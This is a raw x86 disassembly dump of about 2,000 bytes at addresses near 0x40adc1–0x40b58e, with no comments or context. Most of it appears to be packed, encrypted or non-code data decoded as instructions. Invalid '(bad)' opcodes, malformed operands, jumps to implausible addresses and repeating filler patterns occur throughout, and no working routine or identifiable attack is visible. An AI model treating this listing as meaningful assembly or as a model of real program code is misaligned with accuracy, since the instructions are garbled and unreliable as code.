  40adc1:	add    dh,dl
  40adc3:	sub    cl,cl
  40adc5:	scas   eax,DWORD PTR es:[edi]
  40adc6:	add    eax,0x8f095671
  40adcb:	push   esp
  40adcc:	test   al,0x71
  40adce:	xchg   BYTE PTR [esi+0x40],bl
  40add1:	sar    DWORD PTR [edi],0x63
  40add4:	adc    eax,0x457021ce
  40add9:	dec    eax
  40adda:	sahf   
  40addb:	fld    DWORD PTR [ebx+0x62]
  40adde:	mov    al,0xd0
  40ade0:	das    
  40ade1:	sar    ebx,0x48
  40ade4:	mov    al,0xb8
  40ade6:	add    eax,0xde5f4070
  40adeb:	add    BYTE PTR [eax],al
  40aded:	inc    eax
  40adee:	inc    eax
  40adef:	cmovno eax,DWORD PTR ds:0x40056243
  40adf6:	int3   
  40adf7:	add    ah,cl
  40adf9:	inc    eax
  40adfa:	inc    eax
  40adfb:	bound  eax,QWORD PTR [ecx+0x0]
  40adfe:	add    BYTE PTR [edi],cl
  40ae00:	inc    ebx
  40ae01:	inc    eax
  40ae02:	inc    eax
  40ae03:	add    BYTE PTR [ecx+0x43],al
  40ae06:	add    eax,0x40256240
  40ae0b:	bound  eax,QWORD PTR [eax]
  40ae0d:	mov    BYTE PTR [edx+0x62],cl
  40ae10:	xchg   BYTE PTR [esi+0x23],cl
  40ae13:	ret    0x4285
  40ae16:	and    dh,ch
  40ae18:	inc    eax
  40ae19:	inc    eax
  40ae1a:	push   0x23
  40ae1c:	jmp    0xafdd7e5d
  40ae21:	inc    eax
  40ae22:	inc    edx
  40ae23:	gs cld 
  40ae25:	sbb    al,0x3a
  40ae27:	bound  eax,QWORD PTR ds:0xeed42540
  40ae2d:	add    eax,0x4140cc00
  40ae32:	inc    eax
  40ae33:	inc    ebx
  40ae34:	bound  esp,QWORD PTR ds:0x41400043
  40ae3a:	add    BYTE PTR [eax],al
  40ae3c:	add    eax,0x43624062
  40ae41:	inc    ecx
  40ae42:	inc    eax
  40ae43:	inc    eax
  40ae44:	inc    eax
  40ae45:	add    eax,0x40624340
  40ae4a:	add    eax,0x40664140
  40ae4f:	test   al,0x24
  40ae51:	inc    edx
  40ae52:	xchg   BYTE PTR [edx+esi*2-0x63],dl
  40ae56:	adc    edx,DWORD PTR [eax]
  40ae58:	inc    edx
  40ae59:	xor    BYTE PTR ds:0x77754040,ch
  40ae5f:	mov    esp,0x40ae412c
  40ae64:	cmp    DWORD PTR [ecx],ecx
  40ae66:	cwde   
  40ae67:	inc    ecx
  40ae68:	popf   
  40ae69:	test   al,0x5
  40ae6b:	and    BYTE PTR [edx-0x37],dl
  40ae6e:	jnp    0x40ae01
  40ae70:	jp     0x40ae84
  40ae72:	xchg   BYTE PTR [eax+0x40],al
  40ae75:	push   ebx
  40ae76:	mov    al,0xd0
  40ae78:	popa   
  40ae79:	test   al,0x2f
  40ae7b:	jg     0x40aed2
  40ae7d:	rol    BYTE PTR [eax],1
  40ae7f:	retf   
  40ae80:	sub    al,BYTE PTR [ebx+0x0]
  40ae83:	add    eax,0x41107840
  40ae88:	bound  eax,QWORD PTR [eax+0x40]
  40ae8b:	sldt   WORD PTR [eax-0x34]
  40ae8f:	js     0x40aef3
  40ae91:	add    eax,0x40664143
  40ae96:	inc    ebx
  40ae97:	add    BYTE PTR [ecx+0x5],al
  40ae9a:	js     0x40aedc
  40ae9c:	bound  eax,QWORD PTR [eax+0x0]
  40ae9f:	inc    eax
  40aea0:	adc    eax,0x2433caad
  40aea5:	lahf   
  40aea6:	dec    esp
  40aea7:	jge    0x40aeeb
  40aea9:	add    eax,0x4b206a7f
  40aeae:	xchg   edi,eax
  40aeaf:	xor    al,0x72
  40aeb1:	xchg   BYTE PTR [edx+0x40],cl
  40aeb4:	ret    0x7e26
  40aeb7:	(bad)  
  40aeb9:	and    eax,DWORD PTR [eax+0x62]
  40aebc:	das    
  40aebd:	cdq    
  40aebe:	addr16 inc ebx
  40aec0:	bound  ebp,QWORD PTR [eax+eax*2+0x42964516]
  40aec7:	cmp    DWORD PTR [edx],ebp
  40aec9:	add    eax,0x41c04040
  40aece:	inc    ebx
  40aecf:	inc    eax
  40aed0:	inc    eax
  40aed1:	add    eax,0x434162
  40aed6:	inc    eax
  40aed7:	add    BYTE PTR [edx+0x5],ah
  40aeda:	inc    eax
  40aedb:	adc    BYTE PTR [edx+0x40],ah
  40aede:	inc    ebx
  40aedf:	inc    ecx
  40aee0:	add    eax,0x4340
  40aee5:	add    eax,0x404162
  40aeea:	add    BYTE PTR [eax+0x43],al
  40aeed:	inc    eax
  40aeee:	add    eax,0x2648341a
  40aef3:	xchg   BYTE PTR [esp+esi*1+0x7a],cl
  40aef7:	pushf  
  40aef8:	xor    al,0x43
  40aefa:	loope  0x40af6a
  40aefc:	inc    eax
  40aefd:	inc    eax
  40aefe:	sub    ch,dh
  40af00:	jg     0x40af3b
  40af02:	push   esp
  40af03:	stos   DWORD PTR es:[edi],eax
  40af04:	inc    eax
  40af05:	(bad)  
  40af06:	les    edx,FWORD PTR [ecx+0x542be8d]
  40af0c:	adc    BYTE PTR [eax-0x3f],al
  40af0f:	sub    ah,BYTE PTR [edx-0x62]
  40af12:	rol    BYTE PTR [esi+0xa331040],1
  40af18:	and    al,0xa8
  40af1a:	push   esi
  40af1b:	and    DWORD PTR [ebp+edi*2-0x40],edi
  40af1f:	inc    eax
  40af20:	add    BYTE PTR [eax],al
  40af22:	inc    ecx
  40af23:	inc    ebx
  40af24:	add    eax,0x41784062
  40af29:	inc    eax
  40af2a:	inc    eax
  40af2b:	add    BYTE PTR [edi],cl
  40af2d:	bound  eax,QWORD PTR [ebx+0x0]
  40af30:	add    eax,0x25006240
  40af35:	inc    eax
  40af36:	add    eax,0x40254143
  40af3b:	add    eax,0x7e620000
  40af40:	hlt    
  40af41:	adc    BYTE PTR [ebx],ch
  40af43:	stos   BYTE PTR es:[edi],al
  40af44:	xchg   BYTE PTR [esp+esi*1+0x2e],al
  40af48:	bound  esp,QWORD PTR [ecx+edx*8+0x23407c05]
  40af4f:	aaa    
  40af50:	xor    BYTE PTR ds:0x33f58679,al
  40af56:	rcr    DWORD PTR [ebx+0x356ccb28],0x7c
  40af5d:	inc    eax
  40af5e:	inc    edx
  40af5f:	or     DWORD PTR [eax+0x12],eax
  40af62:	bound  ebp,QWORD PTR [ecx+0x29c021e4]
  40af68:	adc    ch,BYTE PTR [esp+0x25407c05]
  40af6f:	pop    es
  40af70:	imul   edx,DWORD PTR ds:0x4386dc,0x40410000
  40af7a:	bound  esp,QWORD PTR [esi+0x0]
  40af7d:	inc    eax
  40af7e:	add    eax,0x5400000
  40af83:	inc    ecx
  40af84:	inc    eax
  40af85:	inc    eax
  40af86:	bound  esp,QWORD PTR ds:0x25050043
  40af8c:	inc    ecx
  40af8d:	inc    ebx
  40af8e:	inc    eax
  40af8f:	test   BYTE PTR [eax+0x0],al
  40af92:	bound  ebx,QWORD PTR [eax+0x62]
  40af95:	inc    ecx
  40af96:	inc    eax
  40af97:	lds    ebp,FWORD PTR [ecx*2+0x6347ca0d]
  40af9e:	ss jl  0x40afe1
  40afa1:	rcl    BYTE PTR [eax-0x57a3b158],0x3c
  40afa8:	add    BYTE PTR [edx],dh
  40afaa:	and    ch,bl
  40afac:	xor    BYTE PTR [edi],ch
  40afae:	add    eax,0x569a237c
  40afb3:	mov    dl,0x10
  40afb5:	bound  eax,QWORD PTR [eax+0x41]
  40afb8:	and    eax,0x40000500
  40afbd:	inc    ebx
  40afbe:	add    eax,0x40624041
  40afc3:	inc    ebx
  40afc4:	add    eax,0x43402541
  40afc9:	bound  eax,QWORD PTR [eax+0x43]
  40afcc:	int3   
  40afcd:	inc    eax
  40afce:	bound  eax,QWORD PTR [eax]
  40afd0:	inc    ecx
  40afd1:	inc    eax
  40afd2:	inc    eax
  40afd3:	add    eax,0x862d6905
  40afd8:	xor    esp,DWORD PTR [esp+ebx*2-0x49]
  40afdc:	fs or  edi,0x35
  40afe0:	jl     0x40b022
  40afe2:	shl    bh,0x24
  40afe5:	les    ebp,FWORD PTR [ebx-0x59]
  40afe8:	and    DWORD PTR [esi],esi
  40afea:	and    ah,BYTE PTR [edi]
  40afec:	dec    eax
  40afed:	dec    edi
  40afee:	test   al,0x5
  40aff0:	jl     0x40b032
  40aff2:	jg     0x40b056
  40aff4:	inc    eax
  40aff5:	and    eax,0x5406600
  40affa:	inc    ebx
  40affb:	inc    ecx
  40affc:	inc    eax
  40affd:	inc    eax
  40affe:	inc    ebx
  40afff:	add    BYTE PTR [eax],al
  40b001:	add    BYTE PTR [edx-0x34],ah
  40b004:	inc    eax
  40b005:	add    eax,0x40004041
  40b00a:	inc    ecx
  40b00b:	int3   
  40b00c:	add    BYTE PTR [ebx-0x7c],al
  40b00f:	add    eax,0x5406240
  40b014:	bound  esp,QWORD PTR [esi+0x67]
  40b017:	adc    BYTE PTR [edx],0x86
  40b01a:	or     ebp,DWORD PTR [ecx]
  40b01c:	int3   
  40b01d:	and    DWORD PTR [edx-0x3b],eax
  40b020:	arpl   WORD PTR [esp+edi*2],bp
  40b023:	inc    eax
  40b024:	daa    
  40b025:	jns    0x40b063
  40b027:	push   eax
  40b028:	arpl   WORD PTR [esi+0x4323247a],sp
  40b02e:	fild   WORD PTR [ebx-0x18]
  40b031:	add    eax,0xf341987c
  40b036:	loopne 0x40b09a
  40b038:	adc    eax,0x414b7486
  40b03d:	adc    cl,0x28
  40b040:	int    0x32
  40b042:	jnp    0x40b084
  40b044:	bound  ebx,QWORD PTR [eax+0x41]
  40b047:	add    eax,0x40404340
  40b04c:	inc    ebx
  40b04d:	inc    eax
  40b04e:	test   BYTE PTR [eax],al
  40b050:	add    eax,0x40624041
  40b055:	inc    eax
  40b056:	add    BYTE PTR [edx+0x5],ah
  40b059:	inc    ebx
  40b05a:	add    BYTE PTR [eax+0x78],al
  40b05d:	inc    ecx
  40b05e:	add    BYTE PTR [eax+0x41],bl
  40b061:	bound  eax,QWORD PTR [ecx]
  40b063:	inc    eax
  40b064:	push   cs
  40b065:	inc    edi
  40b066:	stos   DWORD PTR es:[edi],eax
  40b067:	aaa    
  40b068:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b069:	mov    ah,0x78
  40b06b:	and    al,0x44
  40b06d:	pushf  
  40b06e:	jge    0x40b077
  40b070:	add    eax,0xc367467b
  40b075:	nop
  40b076:	push   ss
  40b077:	bound  eax,QWORD PTR [esi+0x14407e94]
  40b07d:	sub    cl,dh
  40b07f:	les    esp,FWORD PTR ds:0x97ed407b
  40b085:	(bad)  [eax+0x4f]
  40b088:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b089:	lock xor dh,BYTE PTR [eax]
  40b08c:	dec    ebp
  40b08d:	add    BYTE PTR ds:0x407b0500,al
  40b093:	addr16 xchg edx,eax
  40b095:	inc    eax
  40b096:	test   BYTE PTR [eax],al
  40b098:	int3   
  40b099:	bound  eax,QWORD PTR ds:0xcc840f41
  40b09f:	inc    ebx
  40b0a0:	add    BYTE PTR [eax+0x0],al
  40b0a3:	inc    eax
  40b0a4:	inc    eax
  40b0a5:	inc    eax
  40b0a6:	int3   
  40b0a7:	add    BYTE PTR ds:0x62404341,al
  40b0ad:	pop    eax
  40b0ae:	add    BYTE PTR [ebx+0x40],al
  40b0b1:	bound  ecx,QWORD PTR [edi]
  40b0b3:	inc    eax
  40b0b4:	add    bl,cl
  40b0b6:	push   es
  40b0b7:	xchg   BYTE PTR [edx+eiz*1],ch
  40b0ba:	inc    ecx
  40b0bb:	scas   al,BYTE PTR es:[edi]
  40b0bc:	bound  esi,QWORD PTR [ebp+eiz*2+0x4340792c]
  40b0c3:	loopne 0x40b112
  40b0c5:	adc    eax,0x7c44a3d2
  40b0ca:	inc    esi
  40b0cb:	dec    edx
  40b0cc:	test   ebx,0x40400000
  40b0d2:	cmovno eax,DWORD PTR ds:0x40056243
  40b0d9:	int3   
  40b0da:	add    ah,cl
  40b0dc:	inc    eax
  40b0dd:	inc    eax
  40b0de:	bound  eax,QWORD PTR [ecx+0x0]
  40b0e1:	add    BYTE PTR [edi],cl
  40b0e3:	inc    ebx
  40b0e4:	inc    eax
  40b0e5:	inc    eax
  40b0e6:	add    BYTE PTR [ecx+0x43],al
  40b0e9:	add    eax,0x40256240
  40b0ee:	bound  eax,QWORD PTR [eax]
  40b0f0:	fadd   QWORD PTR ds:0xa274c078
  40b0f6:	test   al,0x65
  40b0f8:	popf   
  40b0f9:	xchg   cl,bl
  40b0fb:	push   eax
  40b0fc:	inc    eax
  40b0fd:	cmp    BYTE PTR [ebp+0x7834f82a],ch
  40b103:	inc    esp
  40b104:	push   es
  40b105:	push   esi
  40b106:	aas    
  40b107:	adc    DWORD PTR [eax+0x40603ca2],ebp
  40b10d:	sub    al,0x41
  40b10f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b110:	adc    BYTE PTR ds:0x8f634073,al
  40b116:	or     BYTE PTR ds:0x4a538652,0x20
  40b11d:	add    eax,0x2980cd52
  40b122:	inc    eax
  40b123:	inc    eax
  40b124:	arpl   WORD PTR [ecx],sp
  40b126:	add    eax,0x4140cc00
  40b12b:	inc    eax
  40b12c:	inc    ebx
  40b12d:	bound  esp,QWORD PTR ds:0x41400043
  40b133:	add    BYTE PTR [eax],al
  40b135:	add    eax,0x43624062
  40b13a:	inc    ecx
  40b13b:	inc    eax
  40b13c:	inc    eax
  40b13d:	inc    eax
  40b13e:	add    eax,0x40624340
  40b143:	add    eax,0x40664140
  40b148:	mov    esp,0x40a1c310
  40b14d:	dec    ebp
  40b14e:	inc    eax
  40b14f:	sub    ebx,DWORD PTR [eax+0x400544b0]
  40b155:	inc    eax
  40b156:	and    al,0xbf
  40b158:	bound  eax,QWORD PTR ds:0x7e6c86f9
  40b15e:	add    DWORD PTR [ebx+0x27c44cac],edx
  40b164:	inc    eax
  40b165:	rol    BYTE PTR [eax-0x48],0x5
  40b169:	daa    
  40b16a:	popa   
  40b16b:	mov    al,ds:0x2235f540
  40b170:	retf   
  40b171:	hlt    
  40b172:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40b173:	add    eax,0x434f00
  40b178:	add    eax,0x41107840
  40b17d:	bound  eax,QWORD PTR [eax+0x40]
  40b180:	sldt   WORD PTR [eax-0x34]
  40b184:	js     0x40b1e8
  40b186:	add    eax,0x40664143
  40b18b:	inc    ebx
  40b18c:	add    BYTE PTR [ecx+0x5],al
  40b18f:	js     0x40b1d1
  40b191:	bound  eax,QWORD PTR [eax+0x0]
  40b194:	inc    eax
  40b195:	ja     0x40b185
  40b197:	xchg   edx,eax
  40b198:	inc    esi
  40b199:	pop    esi
  40b19a:	xchg   BYTE PTR [eax+0x6d],al
  40b19d:	inc    eax
  40b19e:	sub    DWORD PTR [ebx+0x54],esi
  40b1a1:	ret    0x7e40
  40b1a4:	adc    eax,0x674ccf32
  40b1a9:	mov    esp,?
  40b1ab:	test   eax,0x8257d7a
  40b1b0:	outs   dx,BYTE PTR ds:[esi]
  40b1b1:	pop    ds
  40b1b2:	add    eax,0xde403f7e
  40b1b7:	inc    esp
  40b1b8:	and    BYTE PTR [ebp+0x2b50f786],bh
  40b1be:	mov    edi,0x2d63a404
  40b1c3:	jge    0x40b198
  40b1c5:	jmp    0x5af3:0x8a059051
  40b1cc:	ret    
  40b1cd:	inc    eax
  40b1ce:	inc    ecx
  40b1cf:	bound  eax,QWORD PTR [edi+0x40404341]
  40b1d5:	add    eax,0x434162
  40b1da:	inc    eax
  40b1db:	add    BYTE PTR [edx+0x5],ah
  40b1de:	inc    eax
  40b1df:	adc    BYTE PTR [edx+0x40],ah
  40b1e2:	inc    ebx
  40b1e3:	inc    ecx
  40b1e4:	add    eax,0x4340
  40b1e9:	add    eax,0x404162
  40b1ee:	add    BYTE PTR [eax+0x43],al
  40b1f1:	inc    eax
  40b1f2:	add    eax,0x73720515
  40b1f7:	and    ecx,DWORD PTR [ebx+0x13]
  40b1fa:	inc    esp
  40b1fb:	push   ebx
  40b1fc:	xchg   BYTE PTR [ebp+0x41],bl
  40b1ff:	jnp    0x40b21d
  40b201:	jo     0x40b206
  40b203:	loop   0x40b234
  40b205:	jno    0x40b258
  40b207:	inc    eax
  40b208:	bound  ebp,QWORD PTR es:[edx-0x6]
  40b20c:	inc    eax
  40b20d:	add    BYTE PTR [eax],al
  40b20f:	inc    ecx
  40b210:	inc    ebx
  40b211:	add    eax,0x41784062
  40b216:	inc    eax
  40b217:	inc    eax
  40b218:	add    BYTE PTR [edi],cl
  40b21a:	bound  eax,QWORD PTR [ebx+0x0]
  40b21d:	add    eax,0x25006240
  40b222:	inc    eax
  40b223:	add    eax,0x40254143
  40b228:	add    eax,0xf2620000
  40b22d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40b22e:	dec    eax
  40b22f:	and    al,BYTE PTR [esi+0x1e]
  40b232:	xor    DWORD PTR [eax+0x59377005],ecx
  40b238:	jnp    0x40b28e
  40b23a:	and    al,0x1c
  40b23c:	xchg   BYTE PTR [edx+0x678a477f],al
  40b242:	inc    ecx
  40b243:	bound  esp,QWORD PTR [ebx]
  40b245:	inc    eax
  40b246:	push   es
  40b247:	push   edi
  40b248:	mov    edi,0xf156db48
  40b24d:	inc    eax
  40b24e:	xor    eax,DWORD PTR [eax+0x4f]
  40b251:	inc    ebx
  40b252:	test   eax,0x43
  40b257:	inc    ecx
  40b258:	inc    eax
  40b259:	bound  esp,QWORD PTR [esi+0x0]
  40b25c:	inc    eax
  40b25d:	add    eax,0x5400000
  40b262:	inc    ecx
  40b263:	inc    eax
  40b264:	inc    eax
  40b265:	bound  esp,QWORD PTR ds:0x25050043
  40b26b:	inc    ecx
  40b26c:	inc    ebx
  40b26d:	inc    eax
  40b26e:	test   BYTE PTR [eax+0x0],al
  40b271:	bound  ebx,QWORD PTR [eax+0x62]
  40b274:	inc    ecx
  40b275:	inc    eax
  40b276:	xchg   BYTE PTR ds:0x2a785840,al
  40b27c:	xor    eax,0x5486059c
  40b281:	jb     0x40b2da
  40b283:	xor    dl,ch
  40b285:	add    eax,0xa9406e17
  40b28a:	inc    eax
  40b28b:	enter  0xcb43,0xd6
  40b28f:	lock inc eax
  40b291:	pop    ecx
  40b292:	ins    DWORD PTR es:[edi],dx
  40b293:	dec    eax
  40b294:	test   al,0x48
  40b296:	push   ebp
  40b297:	add    eax,0x1a28d170
  40b29c:	adc    dh,BYTE PTR ds:0x46408684
  40b2a2:	pop    ecx
  40b2a3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40b2a4:	dec    esp
  40b2a5:	inc    eax
  40b2a6:	pop    ds
  40b2a7:	xor    bh,BYTE PTR [esi+0x33]
  40b2aa:	inc    eax
  40b2ab:	pop    eax
  40b2ac:	adc    DWORD PTR [eax],edx
  40b2ae:	bound  eax,QWORD PTR [eax+0x41]
  40b2b1:	and    eax,0x40000500
  40b2b6:	inc    ebx
  40b2b7:	add    eax,0x40624041
  40b2bc:	inc    ebx
  40b2bd:	add    eax,0x43402541
  40b2c2:	bound  eax,QWORD PTR [eax+0x43]
  40b2c5:	int3   
  40b2c6:	inc    eax
  40b2c7:	bound  eax,QWORD PTR [eax]
  40b2c9:	inc    ecx
  40b2ca:	inc    eax
  40b2cb:	inc    eax
  40b2cc:	add    eax,0xefc15005
  40b2d1:	stos   BYTE PTR es:[edi],al
  40b2d2:	dec    ecx
  40b2d3:	and    al,0xf7
  40b2d5:	inc    ebx
  40b2d6:	inc    edi
  40b2d7:	push   esi
  40b2d8:	add    eax,0x75b717e
  40b2dd:	js     0x40b333
  40b2df:	add    BYTE PTR [esi+0x37405b15],0x24
  40b2e6:	xor    al,0x4a
  40b2e8:	and    eax,0x2f37587e
  40b2ed:	bound  eax,QWORD PTR [eax+0x25]
  40b2f0:	add    BYTE PTR [esi+0x40],ah
  40b2f3:	add    eax,0x40404143
  40b2f8:	inc    ebx
  40b2f9:	add    BYTE PTR [eax],al
  40b2fb:	add    BYTE PTR [edx-0x34],ah
  40b2fe:	inc    eax
  40b2ff:	add    eax,0x40004041
  40b304:	inc    ecx
  40b305:	int3   
  40b306:	add    BYTE PTR [ebx-0x7c],al
  40b309:	add    eax,0x5406240
  40b30e:	bound  esp,QWORD PTR [edx+0x53]
  40b311:	mov    eax,ds:0x613578ee
  40b316:	lock outs dx,BYTE PTR ds:[esi]
  40b318:	cmp    al,0x80
  40b31a:	add    eax,0x37479e7e
  40b31f:	sub    cl,BYTE PTR [ebp+ecx*2-0x7a]
  40b323:	pop    ebx
  40b324:	add    eax,DWORD PTR ds:0xed5306a1
  40b32a:	inc    eax
  40b32b:	bound  ebx,QWORD PTR [eax+0x41]
  40b32e:	add    eax,0x40404340
  40b333:	inc    ebx
  40b334:	inc    eax
  40b335:	test   BYTE PTR [eax],al
  40b337:	add    eax,0x40624041
  40b33c:	inc    eax
  40b33d:	add    BYTE PTR [edx+0x5],ah
  40b340:	inc    ebx
  40b341:	add    BYTE PTR [eax+0x78],al
  40b344:	inc    ecx
  40b345:	add    BYTE PTR [eax+0x41],bl
  40b348:	bound  ebp,QWORD PTR [edi*2-0x1d49beab]
  40b34f:	(bad)  [edx]
  40b351:	in     eax,dx
  40b352:	mov    esi,0x62f959c0
  40b357:	daa    
  40b358:	clc    
  40b359:	add    eax,0x6640137d
  40b35e:	les    ecx,FWORD PTR [esi+edi*8+0x17d8a186]
  40b365:	sbb    ecx,DWORD PTR [edi+0x68]
  40b368:	adc    eax,0x844034
  40b36d:	int3   
  40b36e:	bound  eax,QWORD PTR ds:0xcc840f41
  40b374:	inc    ebx
  40b375:	add    BYTE PTR [eax+0x0],al
  40b378:	inc    eax
  40b379:	inc    eax
  40b37a:	inc    eax
  40b37b:	int3   
  40b37c:	add    BYTE PTR ds:0x62404341,al
  40b382:	pop    eax
  40b383:	add    BYTE PTR [ebx+0x40],al
  40b386:	bound  ecx,QWORD PTR [edi]
  40b388:	inc    eax
  40b389:	jge    0x40b3fe
  40b38b:	das    
  40b38c:	shl    DWORD PTR [ebx],0x53
  40b38f:	inc    ecx
  40b390:	in     al,dx
  40b391:	test   BYTE PTR [esi+0x5d],bl
  40b394:	dec    BYTE PTR [esi+0x7d05a0dd]
  40b39a:	xor    eax,DWORD PTR [eax+0x56]
  40b39d:	arpl   WORD PTR [edx-0x30],bp
  40b3a0:	xchg   bh,ah
  40b3a2:	dec    edi
  40b3a3:	ins    DWORD PTR es:[edi],dx
  40b3a4:	lea    ebx,[eax+eiz*4]
  40b3a7:	push   esp
  40b3a8:	sub    DWORD PTR [ebp-0xe],edi
  40b3ab:	imul   ebx,DWORD PTR [edi-0x68],0xcaebfa42
  40b3b2:	xor    al,BYTE PTR [ecx-0x66]
  40b3b5:	sbb    al,0x1c
  40b3b7:	add    BYTE PTR [eax],al
  40b3b9:	inc    eax
  40b3ba:	inc    eax
  40b3bb:	cmovno eax,DWORD PTR ds:0x40056243
  40b3c2:	int3   
  40b3c3:	add    ah,cl
  40b3c5:	inc    eax
  40b3c6:	inc    eax
  40b3c7:	bound  eax,QWORD PTR [ecx+0x0]
  40b3ca:	add    BYTE PTR [edi],cl
  40b3cc:	inc    ebx
  40b3cd:	inc    eax
  40b3ce:	inc    eax
  40b3cf:	add    BYTE PTR [ecx+0x43],al
  40b3d2:	add    eax,0x40256240
  40b3d7:	bound  eax,QWORD PTR [eax]
  40b3d9:	cld    
  40b3da:	add    eax,0xc3595a7d
  40b3df:	xor    DWORD PTR [eax+0x12],ebp
  40b3e2:	xchg   BYTE PTR ds:0x692e4091,ch
  40b3e8:	mov    esp,0xa27d2766
  40b3ed:	xor    ch,BYTE PTR [eax]
  40b3ef:	push   es
  40b3f0:	push   edx
  40b3f1:	push   esi
  40b3f2:	jmp    0xbd63:0x9d0d5310
  40b3f9:	cli    
  40b3fa:	add    eax,0xf340bb7d
  40b3ff:	mov    al,0x78
  40b401:	add    eax,0x2d577386
  40b406:	mov    eax,0x2f151115
  40b40b:	jge    0x40b3c0
  40b40d:	sbb    dh,BYTE PTR [ecx+0x40cc0005]
  40b413:	inc    ecx
  40b414:	inc    eax
  40b415:	inc    ebx
  40b416:	bound  esp,QWORD PTR ds:0x41400043
  40b41c:	add    BYTE PTR [eax],al
  40b41e:	add    eax,0x43624062
  40b423:	inc    ecx
  40b424:	inc    eax
  40b425:	inc    eax
  40b426:	inc    eax
  40b427:	add    eax,0x40624340
  40b42c:	add    eax,0x40664140
  40b431:	leave  
  40b432:	cmp    eax,0x5d56e98e
  40b437:	arpl   WORD PTR [ecx+eax*2+0x7c0554cb],dx
  40b43e:	push   ebx
  40b43f:	inc    esi
  40b440:	mov    ds:0x86994c4a,al
  40b445:	mov    ecx,0x4202705f
  40b44a:	stos   DWORD PTR es:[edi],eax
  40b44b:	add    BYTE PTR [ebx],ch
  40b44d:	jl     0x40b468
  40b44f:	inc    eax
  40b450:	(bad)  
  40b451:	mov    al,0x67
  40b453:	push   ebx
  40b454:	call   0x93b305f5
  40b459:	fs aaa 
  40b45b:	inc    ebx
  40b45c:	add    BYTE PTR ds:0x41107840,al
  40b462:	bound  eax,QWORD PTR [eax+0x40]
  40b465:	sldt   WORD PTR [eax-0x34]
  40b469:	js     0x40b4cd
  40b46b:	add    eax,0x40664143
  40b470:	inc    ebx
  40b471:	add    BYTE PTR [ecx+0x5],al
  40b474:	js     0x40b4b6
  40b476:	bound  eax,QWORD PTR [eax+0x0]
  40b479:	inc    eax
  40b47a:	mov    dh,0x5
  40b47c:	jl     0x40b455
  40b47e:	inc    eax
  40b47f:	xchg   edx,eax
  40b480:	arpl   WORD PTR [eax+eiz*1+0x7ac1ff86],di
  40b487:	xchg   esp,eax
  40b488:	push   eax
  40b489:	add    eax,0x377c2e63
  40b48e:	ins    DWORD PTR es:[edi],dx
  40b48f:	dec    ebx
  40b490:	inc    ebx
  40b491:	xchg   esi,esi
  40b493:	out    0xe2,eax
  40b495:	retf   0x9b40
  40b498:	dec    esp
  40b499:	inc    edx
  40b49a:	or     eax,0x285b7c05
  40b49f:	lahf   
  40b4a0:	add    eax,0xc58696c9
  40b4a5:	inc    esi
  40b4a6:	inc    ecx
  40b4a7:	inc    ebx
  40b4a8:	inc    eax
  40b4a9:	inc    eax
  40b4aa:	add    eax,0x434162
  40b4af:	inc    eax
  40b4b0:	add    BYTE PTR [edx+0x5],ah
  40b4b3:	inc    eax
  40b4b4:	adc    BYTE PTR [edx+0x40],ah
  40b4b7:	inc    ebx
  40b4b8:	inc    ecx
  40b4b9:	add    eax,0x4340
  40b4be:	add    eax,0x404162
  40b4c3:	add    BYTE PTR [eax+0x43],al
  40b4c6:	inc    eax
  40b4c7:	add    eax,0xb8cb61c2
  40b4cc:	loop   0x40b4f3
  40b4ce:	jl     0x40b523
  40b4d0:	mov    ?,WORD PTR [edx+edi*4]
  40b4d3:	add    eax,0x4e28e654
  40b4d8:	inc    ecx
  40b4d9:	pushf  
  40b4da:	dec    eax
  40b4db:	retf   
  40b4dc:	stc    
  40b4dd:	add    eax,0xaf4a717c
  40b4e2:	adc    al,0x4c
  40b4e4:	hlt    
  40b4e5:	xchg   BYTE PTR [ebx],cl
  40b4e7:	mov    edi,0x40f740
  40b4ec:	add    BYTE PTR [ecx+0x43],al
  40b4ef:	add    eax,0x41784062
  40b4f4:	inc    eax
  40b4f5:	inc    eax
  40b4f6:	add    BYTE PTR [edi],cl
  40b4f8:	bound  eax,QWORD PTR [ebx+0x0]
  40b4fb:	add    eax,0x25006240
  40b500:	inc    eax
  40b501:	add    eax,0x40254143
  40b506:	add    eax,0xcd620000
  40b50b:	adc    eax,0x5a7c2805
  40b510:	sub    BYTE PTR [ebp-0x1abb3441],ah
  40b516:	outs   dx,BYTE PTR ds:[esi]
  40b517:	mov    cl,0x40
  40b519:	xchg   ebp,eax
  40b51a:	mov    edi,0x7c05ef51
  40b51f:	(bad)  
  40b520:	ins    DWORD PTR es:[edi],dx
  40b521:	(bad)  
  40b522:	mov    edi,0x5186f835
  40b527:	xor    ebp,DWORD PTR [edx+0x4d]
  40b52a:	cmp    al,0x80
  40b52c:	repnz xor edi,DWORD PTR [ebx+0x53]
  40b530:	inc    eax
  40b531:	rol    BYTE PTR [ebx+0x0],cl
  40b534:	add    BYTE PTR [eax],al
  40b536:	inc    ecx
  40b537:	inc    eax
  40b538:	bound  esp,QWORD PTR [esi+0x0]
  40b53b:	inc    eax
  40b53c:	add    eax,0x5400000
  40b541:	inc    ecx
  40b542:	inc    eax
  40b543:	inc    eax
  40b544:	bound  esp,QWORD PTR ds:0x25050043
  40b54a:	inc    ecx
  40b54b:	inc    ebx
  40b54c:	inc    eax
  40b54d:	test   BYTE PTR [eax+0x0],al
  40b550:	bound  ebx,QWORD PTR [eax+0x62]
  40b553:	inc    ecx
  40b554:	inc    eax
  40b555:	int    0xc5
  40b557:	adc    eax,0x2ef3b4e4
  40b55c:	xchg   edx,eax
  40b55d:	retf   
  40b55e:	xchg   ecx,eax
  40b55f:	leave  
  40b560:	add    eax,0xcef61a7b
  40b565:	dec    eax
  40b566:	mov    edi,0xd3978626
  40b56b:	inc    ecx
  40b56c:	fild   DWORD PTR [edx]
  40b56e:	inc    eax
  40b56f:	inc    edx
  40b570:	das    
  40b571:	jnp    0x40b595
  40b573:	test   DWORD PTR [esi+ecx*2+0x40],ecx
  40b577:	adc    ebx,esp
  40b579:	cli    
  40b57a:	jg     0x40b5fa
  40b57c:	mul    BYTE PTR [eax]
  40b57e:	inc    ecx
  40b57f:	sub    BYTE PTR ds:0x5b41537b,al
  40b585:	test   al,0x28
  40b587:	cli    
  40b588:	xchg   ch,bl
  40b58a:	mov    ch,0xfa
  40b58c:	js     0x40b5f0
  40b58e:	enter  0x32f0,0x7b
